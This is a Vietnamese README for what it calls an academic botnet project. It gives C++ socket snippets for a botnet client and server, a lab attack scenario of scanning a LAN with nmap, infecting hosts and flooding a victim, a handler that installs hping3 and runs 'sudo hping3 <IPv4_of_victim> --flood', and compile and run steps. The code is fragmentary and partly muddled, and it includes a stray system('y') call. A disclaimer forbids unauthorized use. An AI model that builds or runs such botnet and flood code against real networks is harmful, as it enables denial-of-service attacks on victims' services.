# Dự án xây dựng botnet dựa trên giao thức TCP/IP
- Mục tiêu của dự án là lây nhiễm botnet Client trên nhiều host (thiết bị người dùng đầu cuối) sử dụng IPv4 (AF_INET).
- Sử dụng giao thức TCP/IP, biên dịch và thực hiện trên hệ điều hành ubuntu (hoặc core linux).
- **CẢNH BÁO:** Đây chỉ là dự án mang tính chất học thuật, nghiên cứu và đưa ra hướng giải quyết và khắc phục botnet trong hệ thống mạng. Tuyệt đối không áp dụng lên hệ thống mạng nếu không được đồng ý hoặc chấp nhận. *Hành vi tấn công mạng được xem là vi phạm pháp luật*.

## Cấu hình - Kịch bản tấn công

**Cấu hình thiết bị**
|STT|Thiết bị - Hệ điều hành|Địa chỉ IPv4|
|:-|:-|:-|
|1|Attacker - Ubuntu|VMnet0 (192.168.1.0/24)|
|2|Botnet - Ubuntu|VMnet2 (192.168.0.0/24)|
|3|Victim - Windows 7|VMnet2 (192.168.0.0/24)|

**Kịch bản tấn công:**
+ Attacker sẽ tiến hành tham dò mạng nội bộ (nmap) để xác định các host có khả năng lây nhiễm botnet.
+ Sau đó, attacker sẽ lây nhiễm botnet cho các máy trong mạng LAN (user, server tải file trên mạng có chứa botnet Client). 
+ Lúc này, attacker sẽ điều khiển các client để tập trung vào tấn công flood đến host nạn nhân.
+ ***Kết quả:*** Làm cho các dịch vụ trên host bị tấn công trì trệ, không thể hoạt động.


## Botnet Client (botnetClient.cpp)

**Thiết lập địa chỉ server**

```
sockaddr_in serverAddr;
serverAddr.sin_family = AF_INET;
serverAddr.sin_port = htons(45444);
inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);
```

|Thuộc tính|Giải thích|
|:-|:-|
|`sockaddr_in`|Lưu trữ thông tin server|
|`sin_family`|Chỉ định loại địa chỉ|
|`sin_port`|Cổng kết nối Client - Server|
|`htons()`|Hàm băm dạng địa chỉ mạng|
|`inet_pton`|Chuyển đổi chuỗi địa chỉ mạng sang dạng nhị phân|

**Kết nối tới Server**

```
if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
{
    cerr << "Connection failed!" << endl;
    return -1;
}
```
|Thuộc tính|Giải thích|
|:-|:-|
|`connect()`|Kết nối đến socket của client với địa chỉ của server|

**Gửi dữ liệu đến Server**
```
string request = "terminal";
send(clientSocket, request.c_str(), request.size(), 0);
```
Gửi dữ liệu đến Server, khi kết nối thành công, client sẽ mở Terminal.

## Botnet Server (botnetServer.cpp)

```
serverAddr.sin_port = htons(PORT);
serverAddr.sin_addr.s_addr = INADDR_ANY;
```
Số cổng của Server kết nối đến Client `htons(PORT)`.
Thuộc tính `INADDR_ANY` chấp nhận kết nối từ bất kỳ địa chỉ IP nào.

**Gán địa chỉ cho socket**
```
if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
{
    cerr << "Bind failed!" << endl;
    return -1;
}
```
Gán địa chỉ IP và cổng vừa thiết lập cho socket.

**Lắng nghe kết nối**
```
listen(serverSocket, 10);
``` 
Cho phép tối đa 10 kết nối trong hàng đợi.

**Nhận dữ liệu từ client**
```
int bytesReceived = recv(clientSocket, buffer, 4096, 0);
```
Hàm `recv()` đọc dữ liệu từ client gửi đến và lưu vào `buffer`.

## Xử lý yêu cầu từ Client - Thực hiện quá trình 
```
if (request == "terminal") 
{
    cout << "Opening terminal..." << endl;
    system("gnome-terminal");
    system("sudo apt install hping3");
    system("y");
    system("sudo hping3 <IPv4_of_victim> --flood");
}
```
Nếu Server nhận được phản hồi từ Client gửi đến đáp ứng điều kiện yêu cầu "request". Server tiến hành mở Terminal, Cài đặt [HPING3](https://www.kali.org/tools/hping3/) để tiến hành ping flood.

## Biên dịch (Compile)
Cài đặt trình biên dịch để sử dụng thư viện:
`sudo apt install g++`

**Server:** `g++ botnetServer.cpp -o botnetServer`

**Client:** `g++ botnetClient.cpp -o botnetClient`

## Khởi chạy (Run)

**Server:** `./botnetServer`

**Client:** `./botnetClient`

## Kiểm thử kịch bản, chương trình tấn công botnet

**Host trước khi bị tấn công**

![](img/1.png)

**Host trong quá trình bị tấn công**

![](img/2.png)